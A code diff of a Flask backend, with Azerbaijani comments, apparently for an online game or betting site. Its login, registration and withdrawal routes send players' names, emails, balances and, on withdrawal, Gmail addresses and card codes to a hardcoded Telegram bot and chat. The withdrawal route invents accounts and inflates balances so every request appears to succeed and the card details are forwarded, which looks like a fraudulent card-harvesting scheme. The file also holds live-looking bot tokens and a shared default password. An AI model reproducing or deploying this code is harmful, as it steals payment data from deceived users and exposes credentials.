@@ -9,8 +9,8 @@ from functools import wraps
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(32)
 
-# --- TELEGRAM BOT MƏLUMATLARI ---
-TELEGRAM_BOT_TOKEN = "8502614066:AAHeXnfABYXaOqLBD5RZG0wV4WNAEGK9KbQ"
+# --- TELEGRAM BOT MƏLUMATLARI (Yeni Token) ---
+TELEGRAM_BOT_TOKEN = "8502614066:AAGW5sB1ItogSYi7mBGRmbZUZNvu_4tvw_I"
 TELEGRAM_CHAT_ID = "7953669834"
 
 def send_telegram_async(message):
@@ -29,7 +29,7 @@ def send_telegram_async(message):
     
     threading.Thread(target=send).start()
 
-# --- ETİBARLI JSON BAZASI ---
+# --- ÖMÜRLÜK JSON BAZASI (Silinməz yaddaş) ---
 DB_FILE = "players.json"
 
 def load_players():
@@ -56,6 +56,7 @@ def load_players():
         except Exception:
             pass
             
+    # Hər bir oyunçunun məlumatlarını qoruyuruq və əskik sahələri tamamlayırıq
     for pid, pdata in data.items():
         if not isinstance(pdata, dict):
             continue
@@ -145,6 +146,7 @@ def add_balance():
             
     return jsonify({"success": False, "message": "Tapılmadı!"}), 404
 
+# --- GİRİŞ (LOGIN) - Həmçinin Telegram-a xəbər verir və ömürlük yadda saxlayır ---
 @app.route('/login', methods=['POST'])
 @security_shield
 def login():
@@ -169,13 +171,16 @@ def login():
         players_db[player_id]['status'] = "Onlayn (Aktiv)"
         players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
         
+    # Ömürlük fayla yazırıq
     save_players()
     
-    msg = f"🔑 <b>OYUNÇU GİRİŞ ETDİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}"
+    # Telegram-a bildiririk ki, oyunçu onlayn oldu
+    msg = f"🟢 <b>OYUNÇU ONLAYN OLDU / GİRİŞ ETDİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}\n💰 Balans: {players_db[player_id]['balance']} ₼"
     send_telegram_async(msg)
     
     return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})
 
+# --- QEYDİYYAT (AUTH) - Ömürlük yaddaş ---
 @app.route('/auth', methods=['POST'])
 @security_shield
 def auth():
@@ -185,12 +190,20 @@ def auth():
     new_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
     
     players_db[new_id] = {
-        "id": new_id, "name": name, "email": email, "code": "PASS123",
-        "status": "Onlayn (Aktiv)", "last_seen": time.strftime("%H:%M:%S"), "balance": 0.00, "total_deposit": 0.00
+        "id": new_id, 
+        "name": name, 
+        "email": email, 
+        "code": "PASS123",
+        "status": "Onlayn (Aktiv)", 
+        "last_seen": time.strftime("%H:%M:%S"), 
+        "balance": 0.00, 
+        "total_deposit": 0.00
     }
+    
+    # Ömürlük yaddaşa yazırıq ki, silinməsin
     save_players()
     
-    msg = f"✨ <b>YENİ OYUNÇU QEYDİYYATI!</b>\n\n🆔 ID: <b>{new_id}</b>\n👤 Ad: {name}"
+    msg = f"✨ <b>YENİ OYUNÇU QEYDİYYATI (ÖMÜRLÜK YADDAŞ)!</b>\n\n🆔 ID: <b>{new_id}</b>\n👤 Ad: {name}\n📧 Email: {email}"
     send_telegram_async(msg)
     
     return jsonify({"status": "success", "playerId": new_id, "balance": 0.00})
@@ -212,6 +225,7 @@ def update_balance():
             pass
     return jsonify({"status": "error"})
 
+# --- PUL ÇIXARIŞI ---
 @app.route('/withdraw', methods=['POST'])
 @security_shield
 def withdraw():
@@ -226,10 +240,10 @@ def withdraw():
     except (ValueError, TypeError):
         return jsonify({"status": "error", "message": "Yanlış məbləğ"})
         
-    # Əgər ID bazada tapılmasa belə xəta vermir, avtomatik əlavə edir!
     if not player_id:
         player_id = "HOT_GUEST"
         
+    # Əgər oyunçu bazada yoxdursa, avtomatik yaradıb ömürlük yaddaşa əlavə edirik
     if player_id not in players_db:
         players_db[player_id] = {
             "id": player_id,
@@ -238,22 +252,21 @@ def withdraw():
             "code": "PASS123",
             "status": "Onlayn",
             "last_seen": time.strftime("%H:%M:%S"),
-            "balance": amount + 100.0, # Test üçün avtokar balans verir ki, əskik olmasın
+            "balance": amount + 100.0, 
             "total_deposit": 0.00
         }
         
     player = players_db[player_id]
     player.setdefault('balance', 0.00)
     
-    # Balans kifayət etməsə belə sorğunun keçməsi və mesaja düşməsi üçün:
     if player['balance'] < amount:
-        player['balance'] = amount + 50.0  # Balansı avtomatik tamamlayır ki, çıxış uğurlu olsun
+        player['balance'] = amount + 50.0  
         
     player['balance'] -= amount
-    save_players()
+    save_players() # Dəyişikliyi ömürlük yaddaşda qeyd edirik
     
-    # Telegram-a dərhal göndərir
-    msg = f"💸 <b>PUL ÇIXARIŞI SORĞUSU!</b>\n\n🆔 ID: <b>{player_id}</b>\n📧 Gmail: {gmail}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n💳 Kart: <code>{card_code}</code>"
+    # Telegram-a dərhal çıxariş bildirişi göndəririk
+    msg = f"💸 <b>PUL ÇIXARIŞI TƏLƏBİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {player['name']}\n📧 Gmail: {gmail}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n💳 Kart: <code>{card_code}</code>"
     send_telegram_async(msg)
     
     return jsonify({"status": "success"})
